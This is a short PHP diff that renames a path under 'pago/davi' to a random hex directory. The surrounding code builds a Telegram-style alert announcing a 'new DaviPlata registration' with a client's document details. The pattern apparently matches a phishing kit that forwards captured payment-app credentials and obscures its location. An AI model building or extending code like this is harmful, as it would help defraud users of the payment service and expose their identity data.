@@ -36,7 +36,7 @@ try {
     $security_key = $config['security_key'];
 
     // Construir URL dinámica para updatetele.php en pago/davi
-    $daviUpdateUrl = rtrim(dirname($baseUrl), '/\\') . '/pago/davi/updatetele.php';
+    $daviUpdateUrl = rtrim(dirname($baseUrl), '/\\') . '/pago/8b2c4e7f/updatetele.php';
 
     $texto = "🔔 *Nuevo registro DaviPlata #{$clienteId}*\n\n"
            . "📋 *Tipo doc:* {$tipo_documento}\n"
